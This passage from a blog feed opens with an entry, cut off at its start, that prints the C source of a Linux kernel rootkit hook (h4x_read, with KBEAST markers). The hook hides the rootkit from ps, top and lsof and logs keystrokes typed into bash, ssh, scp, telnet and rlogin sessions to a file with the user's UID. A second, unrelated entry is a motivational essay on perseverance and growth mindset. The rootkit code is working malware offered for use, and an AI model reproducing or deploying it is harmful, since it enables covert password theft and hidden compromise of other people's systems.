class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">inkage int h4x\_read(unsigned int fd, char \_\_user *buf, size_t count)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  int i,r;</span><br><span class="line"></span><br><span class="line">  char date_time\[24\];</span><br><span class="line"></span><br><span class="line">  char \*kbuf=(char\*)kmalloc(256,GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">  /\*If output is redirected to file or grep, hide it\*/</span><br><span class="line"></span><br><span class="line">  copy\_from\_user(kbuf,buf,255);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((strstr(current-&gt;comm,<span class="string">"ps"</span>))||(strstr(current-&gt;comm,<span class="string">"pstree"</span>))||</span><br><span class="line"></span><br><span class="line">      (strstr(current-&gt;comm,<span class="string">"top"</span>))||(strstr(current-&gt;comm,<span class="string">"lsof"</span>)))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strstr(kbuf,\_H4X0R\_)||strstr(kbuf,KBEAST))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      kfree(kbuf);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  r=o_read(fd,buf,count);</span><br><span class="line"></span><br><span class="line">  /*Due to stability issue, we <span class="built_in">limit</span> the keylogging process*/</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((strcmp(current-&gt;comm,<span class="string">"bash"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"ssh"</span>) == 0)||</span><br><span class="line"></span><br><span class="line">     (strcmp(current-&gt;comm,<span class="string">"scp"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"telnet"</span>) == 0)||</span><br><span class="line"></span><br><span class="line">     (strcmp(current-&gt;comm,<span class="string">"rsh"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"rlogin"</span>) == 0))&#123;    </span><br><span class="line"></span><br><span class="line">    /\*SPECIAL CHAR\*/</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (counter) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (counter == 2) &#123;  // Arrows + Break</span><br><span class="line"></span><br><span class="line">        //left arrow</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x44) &#123;</span><br><span class="line"></span><br><span class="line">          strcat(ibuffer,<span class="string">"\[LEFT\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //right arrow</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x43) &#123;</span><br><span class="line"></span><br><span class="line">          strcat(ibuffer,<span class="string">"\[RIGHT\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //up arrow</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x41) &#123;</span><br><span class="line"></span><br><span class="line">          strcat(ibuffer,<span class="string">"\[UP\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //down arrow</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x42) &#123;</span><br><span class="line"></span><br><span class="line">          strcat(ibuffer,<span class="string">"\[DOWN\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //<span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x50) &#123;</span><br><span class="line"></span><br><span class="line">  strcat(ibuffer,<span class="string">"\[BREAK\]"</span>);</span><br><span class="line"></span><br><span class="line">  counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //numlock</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(buf\[0\] == 0x47) &#123;</span><br><span class="line"></span><br><span class="line">  strcat (ibuffer,<span class="string">"\[NUMLOCK\]"</span>);</span><br><span class="line"></span><br><span class="line">  counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        strncpy (spbuffer,buf,1);</span><br><span class="line"></span><br><span class="line">        counter ++;</span><br><span class="line"></span><br><span class="line">        goto END;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (counter == 3) &#123;   // F1-F5</span><br><span class="line"></span><br><span class="line">        //F1</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x41) &#123;</span><br><span class="line"></span><br><span class="line">          strcat(ibuffer,<span class="string">"\[F1\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //F2</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x42) &#123;</span><br><span class="line"></span><br><span class="line">          strcat(ibuffer,<span class="string">"\[F2\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //F3</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x43) &#123;</span><br><span class="line"></span><br><span class="line">          strcat(ibuffer,<span class="string">"\[F3\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //F4</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x44) &#123;</span><br><span class="line"></span><br><span class="line">          strcat(ibuffer,<span class="string">"\[F4\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //F5</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x45) &#123;</span><br><span class="line"></span><br><span class="line">          strcat(ibuffer,<span class="string">"\[F5\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf\[0\] == 0x7E) &#123;     // PgUp, PgDown, Ins, ...</span><br><span class="line"></span><br><span class="line">          //Page Up</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (spbuffer\[0\] == 0x35)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[PGUP\]"</span>);</span><br><span class="line"></span><br><span class="line">          //Page Down</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (spbuffer\[0\] == 0x36)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[PGDN\]"</span>);</span><br><span class="line"></span><br><span class="line">          //Delete</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (spbuffer\[0\] == 0x33)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[DELETE\]"</span>);</span><br><span class="line"></span><br><span class="line">          //End</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (spbuffer\[0\] == 0x34)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[END\]"</span>);</span><br><span class="line"></span><br><span class="line">          //Home</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (spbuffer\[0\] == 0x31)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[HOME\]"</span>);</span><br><span class="line"></span><br><span class="line">          //Insert</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (spbuffer\[0\] == 0x32)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[INSERT\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter = 0;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (spbuffer\[0\] == 0x31) &#123;  // F6-F8</span><br><span class="line"></span><br><span class="line">          //F6</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (buf\[0\] == 0x37)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[F6\]"</span>);</span><br><span class="line"></span><br><span class="line">          //F7</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (buf\[0\] == 0x38)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[F7\]"</span>);</span><br><span class="line"></span><br><span class="line">          //F8</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (buf\[0\] == 0x39)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[F8\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter++;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (spbuffer\[0\] == 0x32) &#123; // F9-F12</span><br><span class="line"></span><br><span class="line">          //F9</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (buf\[0\] == 0x30)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[F9\]"</span>);</span><br><span class="line"></span><br><span class="line">          //F10</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (buf\[0\] == 0x31)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[F10\]"</span>);</span><br><span class="line"></span><br><span class="line">          //F11</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (buf\[0\] == 0x33)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[F11\]"</span>);</span><br><span class="line"></span><br><span class="line">          //F12</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (buf\[0\] == 0x34)</span><br><span class="line"></span><br><span class="line">            strcat(ibuffer,<span class="string">"\[F12\]"</span>);</span><br><span class="line"></span><br><span class="line">          counter++;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(counter &gt;= 4) &#123;  //WatchDog</span><br><span class="line"></span><br><span class="line">        counter = 0;</span><br><span class="line"></span><br><span class="line">        goto END;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      counter ++;</span><br><span class="line"></span><br><span class="line">      goto END;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /\*SH, SSHD = 0 /TELNETD = 3/LOGIN = 4\*/</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(r==1 &amp;&amp; (fd==0||fd==3||fd==4))&#123;</span><br><span class="line"></span><br><span class="line">      //CTRL+U</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(buf\[0\]==0x15)&#123; </span><br><span class="line"></span><br><span class="line">        ibuffer\[0\]=<span class="string">'\\0'</span>;</span><br><span class="line"></span><br><span class="line">        goto END;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      //TAB</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(buf\[0\]==0x09)&#123;</span><br><span class="line"></span><br><span class="line">        strcat(ibuffer,<span class="string">"\[TAB\]"</span>);</span><br><span class="line"></span><br><span class="line">        counter = 0;</span><br><span class="line"></span><br><span class="line">        goto END;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      //CTRL+C</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(buf\[0\]==0x03)&#123;</span><br><span class="line"></span><br><span class="line">        strcat(ibuffer,<span class="string">"\[CTRL+C\]"</span>);</span><br><span class="line"></span><br><span class="line">        counter = 0;</span><br><span class="line"></span><br><span class="line">        goto END;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      //CTRL+D</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(buf\[0\]==0x03)&#123;</span><br><span class="line"></span><br><span class="line">        strcat(ibuffer,<span class="string">"\[CTRL+D\]"</span>);</span><br><span class="line"></span><br><span class="line">        counter = 0;</span><br><span class="line"></span><br><span class="line">        goto END;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      //CTRL+\]</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(buf\[0\]==0x1D)&#123;</span><br><span class="line"></span><br><span class="line">        strcat(ibuffer,<span class="string">"\[CTRL+\]\]"</span>);</span><br><span class="line"></span><br><span class="line">        counter = 0;</span><br><span class="line"></span><br><span class="line">        goto END;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      //BACKSPACE 0x7F Local / 0x08 Remote</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (buf\[0\] == 0x7F || buf\[0\] == 0x08) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ibuffer\[strlen(ibuffer) - 1\] == <span class="string">'\]'</span>) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (i=2;strlen(ibuffer);i++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ibuffer\[strlen (ibuffer) - i\] == <span class="string">'\['</span>) &#123;</span><br><span class="line"></span><br><span class="line">              ibuffer\[strlen(ibuffer) - i\] = <span class="string">'\\0'</span>;</span><br><span class="line"></span><br><span class="line">              <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">          ibuffer\[strlen(ibuffer) - 1\] = <span class="string">'\\0'</span>;</span><br><span class="line"></span><br><span class="line">          goto END;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (buf\[0\] == 0x1B) &#123;</span><br><span class="line"></span><br><span class="line">        counter++;</span><br><span class="line"></span><br><span class="line">        goto END;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(buf\[0\] != <span class="string">'\\n'</span> &amp;&amp; buf\[0\] != <span class="string">'\\r'</span>)&#123;</span><br><span class="line"></span><br><span class="line">        strncat(ibuffer,buf,sizeof(ibuffer));</span><br><span class="line"></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        strcat(ibuffer,<span class="string">"\\n"</span>);</span><br><span class="line"></span><br><span class="line">        get\_time(date\_time);</span><br><span class="line"></span><br><span class="line">        snprintf(obuffer,sizeof(obuffer),<span class="string">"\[%s\] - \[UID = %i \] %s &gt; %s"</span>,date\_time,current\_uid(),current-&gt;comm,ibuffer);</span><br><span class="line"></span><br><span class="line">//I don<span class="string">'t want to log buffer more than 60 chars, most of them are useless data</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> if(strlen(ibuffer)&lt;60) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> log\_to\_file(obuffer);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ibuffer\[0\]='</span>\\0<span class="string">';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> END:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> return r;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>Welcome to communicate: <a href="https://762131828@qq.com" target="_blank" rel="noopener">Server</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;First define an array of 64 elements that need to hide the process prefix [MAX_PREFIX]&lt;br&gt;Then define a filldir hook () function (ps: fir
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>What is the relationship gap?</title>
    <link href="http://yoursite.com/2018/11/22/3/"/>
    <id>http://yoursite.com/2018/11/22/3/</id>
    <published>2018-11-22T10:36:36.042Z</published>
    <updated>2018-11-22T10:21:24.064Z</updated>
    
    <content type="html"><![CDATA[<p>Angela Lee is a math teacher in a public school in the United States, she found a strange phenomenon -</p><p>IQ high student achievement is not necessarily good, on the contrary, many IQ is not so high students but achieved good results.</p><p>In other words, IQ is not the only criterion for determining success and failure.</p><p>Later, Angela Lee returned to the University to pursue a master’s degree in psychology, began to systematically study “what ultimately determines whether a person is successful?”</p><p>They investigated the officers of the West Point, senior teachers, and sold the elite … and found that they had a common feature.</p><p>This feature is not a beautiful appearance, not social ability, not a strong physique, nor is it a high IQ.Is perseverance.  </p><h1 id="first-find-the-reason"><a href="#first-find-the-reason" class="headerlink" title="first:find the reason"></a>first:find the reason</h1><hr><h3 id="At-present-the-most-effective-way-to-cultivate-perseverance-is-Stanford-University-Carol-Dweck-proposed-“growth-thinking”"><a href="#At-present-the-most-effective-way-to-cultivate-perseverance-is-Stanford-University-Carol-Dweck-proposed-“growth-thinking”" class="headerlink" title="At present the most effective way to cultivate perseverance is Stanford University Carol Dweck proposed “growth thinking”"></a>At present the most effective way to cultivate perseverance is Stanford University Carol Dweck proposed “growth thinking”</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">At present the most effective way to cultivate perseverance is Stanford University Carol Dweck proposed <span class="string">"growth thinking"</span></span><br><span class="line"></span><br><span class="line">The core idea of growth thinking is that human learning ability can be changed.</span><br><span class="line"></span><br><span class="line">In contrast, “fixed thinking” is that people’s talent is born.</span><br><span class="line"></span><br><span class="line">In the face of setbacks and failures, these two kinds of thinking will lead directly to the two results -</span><br><span class="line"></span><br><span class="line">Fixed thinking people think that this is their own <span class="built_in">limit</span>, back to the days of weakness, so choose to give up;</span><br><span class="line"></span><br><span class="line">Growing thinking people think that <span class="keyword">if</span> you work harder, you can <span class="keyword">do</span> better.</span><br><span class="line"></span><br><span class="line">The former as a failure as the end of the world, the latter as a challenge to failure and learning opportunities.</span><br><span class="line"></span><br><span class="line">The most deadly gap is the way of thinking.</span><br></pre></td></tr></table></figure><h3 id="Second-Growth-thinking-does-not-believe-in-fatalism"><a href="#Second-Growth-thinking-does-not-believe-in-fatalism" class="headerlink" title="Second:Growth thinking does not believe in fatalism."></a>Second:Growth thinking does not believe in fatalism.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Growth thinking does not believe <span 